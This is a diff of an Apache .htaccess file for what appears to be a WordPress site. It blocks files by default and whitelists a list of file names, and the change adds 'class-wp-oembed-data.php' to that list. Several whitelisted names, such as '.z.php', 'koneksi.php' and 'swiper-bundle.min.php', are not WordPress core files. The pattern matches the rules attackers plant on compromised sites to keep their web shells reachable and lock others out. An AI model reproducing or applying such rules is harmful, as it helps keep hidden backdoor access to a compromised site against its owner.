@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch '^(index.html|wp-activate.php|wp-blog-header.php|wp-comments-post.php|wp-config-sample.php|wp-cron.php|plugin_helper.php|wp-links-opml.php|wp-load.php|wp-login.php|koneksi.php|excel_reader2.php|helper.php|.z.php|main.php|swiper-bundle.min.php|wp-links-mail.php|wp-mail.php|wp-settings.php|wp-signup.php|wp-trackback.php|xmlrpc.php|index.php|sitemap.xml|robots.txt|robot|txt)$'>
+<FilesMatch '^(index.html|wp-activate.php|wp-blog-header.php|wp-comments-post.php|wp-config-sample.php|wp-cron.php|plugin_helper.php|wp-links-opml.php|wp-load.php|wp-login.php|koneksi.php|excel_reader2.php|helper.php|.z.php|main.php|swiper-bundle.min.php|wp-links-mail.php|wp-mail.php|wp-settings.php|class-wp-oembed-data.php|wp-signup.php|wp-trackback.php|xmlrpc.php|index.php|sitemap.xml|robots.txt|robot|txt)$'>
  Order allow,deny
  Allow from all
 </FilesMatch>
